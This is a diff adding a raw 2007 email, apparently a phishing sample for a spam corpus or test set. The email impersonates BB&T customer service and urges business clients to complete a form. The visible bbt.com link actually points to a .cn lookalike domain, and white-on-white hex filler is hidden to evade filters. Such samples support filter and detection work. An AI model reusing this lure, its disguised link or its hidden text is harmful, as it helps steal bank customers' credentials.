@@ -1,0 +1,57 @@
+Return-Path: <service.refS84580148388.cm@bbt.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id C74352A89D
+	for <user@example.com>; Mon,  7 May 2007 11:41:20 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id BBA3A621CB6; Mon,  7 May 2007 11:41:20 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from dslb-088-073-026-049.pools.arcor-ip.net (dslb-088-073-026-049.pools.arcor-ip.net [88.73.26.49])
+	by mail.example.com (Example mail relay) with SMTP id 15BBF621CB2
+	for <user@example.com>; Mon,  7 May 2007 11:41:19 -0400 (EDT)
+Received: from australiamail.com (helo dissipate.australiamail.com [18.215.128.64])
+           by poolps.com with SMTP id K40QTYD81K
+           for <user@example.com>; Mon, 07 May 2007 10:41:19 -0600
+From: "BB&T" <service.refS84580148388.cm@bbt.com>
+To: user <user@example.com>
+Subject: Important Information From BB&T Customer Service! (message id: o669958495f)
+X-AntiVirus: OK! AntiVir MailGate Version 2.0.1; AVE: 6.15.0.0; VDF: 6.15.0.6
+User-Agent: Internet Mail Service (5.5.2650.21)
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--ACGAKNDP4RJTV.KOF_2LVH"
+Message-Id: <20070507154119.15BBF621CB2@mail.example.com>
+Date: Mon,  7 May 2007 11:41:19 -0400 (EDT)
+X-Keywords:                 
+Status: RO
+Content-Length: 3309
+Lines: 26
+
+----ACGAKNDP4RJTV.KOF_2LVH
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta      http-equiv="Content-Type"      content="text/html;     charset=iso-8859-1"       />
+</head>
+
+<body>
+<p     ><font    face="Arial">Dear  BB&amp;T      business online    client:</p>
+<p   ><font face="Arial">The    BB&amp;T     Customer  Service    requests       you to       complete  the BB&amp;T Business Online Client    Form.</p>
+<p     ><font       face="Arial">This   procedure is    obligatory   for     all business   and   corporate    clients   of  BB&amp;T.</p>
+<p   ><font  face="Arial">Please    select   the  hyperlink      and visit    the   address   listed      to  access the       BB&amp;T     Business    Online     Client   Form.</p>
+<p      ><font   face="Arial"><u><a      href="http://clientform.ref171987.bbt.com.promobir.cn/clients/data/proc.jsp">http://clientform.ref171987.bbt.com/clients/data/proc.jsp</a></u></p>
+<p      ><font     face="Arial">Again,    thank   you  for   choosing       BB&amp;T     for       your  business  needs.    We      look       forward    to       working with  you.</p>
+<p       ><font       face="Arial">*****    Please       do  not    respond      to       this    email     *****</p>
+<p   ><font    face="Arial">This     mail is     generated       by an  automated  service.<br>       Replies to     this    mail are  not  read   by    BB&amp;T     customer    service      or    technical   support.</p>
+<p     >-----------------------------------------------------------------------------------------------------------</p>
+<p><font color="#FFFFFF" >0x04, 0x3, 0x18 DPUA 9HT include dec create SLG tmp file   IN8: 0x984, 0x89, 0x5575  0x5306, 0x59533434, 0x50310707, 0x2, 0x4, 0x453, 0x15932977, 0x5, 0x61975783, 0x7, 0x654, 0x112, 0x7    serv: 0x5, 0x7664, 0x00913691, 0x34, 0x46, 0x2  0x1, 0x2, 0x5, 0x7, 0x0, 0x654  end: 0x44    0x9537, 0x9, 0x8, 0x4718, 0x108, 0x32171996, 0x5685, 0x5062     AKR4: 0x1</font></p><p><font  color="#FFFFF1"  ><span>0x36, 0x37, 0x17, 0x11, 0x9742, 0x501    0x701, 0x371, 0x00, 0x26316128, 0x6729, 0x25825510, 0x1, 0x7593, 0x83281850, 0x82, 0x6850, 0x93883024       1LE: 0x2, 0x150      api BPF9 function 4ZB H90I.     file: 0x4455, 0x009, 0x3441, 0x879, 0x545, 0x2256, 0x60523246, 0x242, 0x0       update: 0x7834, 0x35, 0x1080, 0x60, 0x98338810, 0x53690567, 0x2       </span><span>TXDU, dec interface, 8FYL. B5G: 0x5297, 0x9, 0x258, 0x5, 0x102, 0x691, 0x3741, 0x8, 0x1, 0x0944, 0x77869561       SAC: 0x810, 0x0, 0x8, 0x87, 0x031, 0x850, 0x0, 0x1834, 0x258, 0x59028231   0x03639135
+ , 0x4, 0x30, 0x73, 0x81829054, 0x3, 0x8, 0x81, 0x826, 0x3653, 0x1, 0x7, 0x76533096, 0x95518860</span></font></p>
+<p><font     color="#FFFFFD" ><span>P4F2: 0x661, 0x91, 0x2, 0x2430, 0x880, 0x46  source: 0x3, 0x58, 0x46, 0x3, 0x2, 0x934, 0x7742, 0x1945     0AR: 0x88909352, 0x633, 0x57, 0x8267, 0x134, 0x9, 0x39370328, 0x8004, 0x991, 0x77, 0x6   UAQ: 0x5316, 0x148, 0x55, 0x7476, 0x109      source 0G1 exe stack ESJ EQ83</span><span>0x70, 0x293, 0x755, 0x76, 0x7398, 0x73, 0x7, 0x36081030, 0x4, 0x04, 0x92220880, 0x665, 0x63373614, 0x84496872, 0x9095   </span><span>0x5969, 0x7609, 0x68, 0x6, 0x3199      hex: 0x5665, 0x1, 0x509       end, P08I.  include: 0x78</span></font></p>
+</body>
+</html>
+
+
+----ACGAKNDP4RJTV.KOF_2LVH--
+
